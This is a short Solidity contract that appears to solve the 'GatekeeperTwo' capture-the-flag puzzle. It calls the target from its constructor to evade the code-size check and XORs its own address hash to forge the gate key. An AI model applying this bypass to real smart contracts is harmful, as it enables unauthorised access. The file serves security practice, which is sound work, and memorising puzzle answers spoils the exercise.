// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "@puzzles/14/GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    constructor(address target) {
        GatekeeperTwo puzzleContract = GatekeeperTwo(target);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        puzzleContract.enter(gateKey);
    }
}
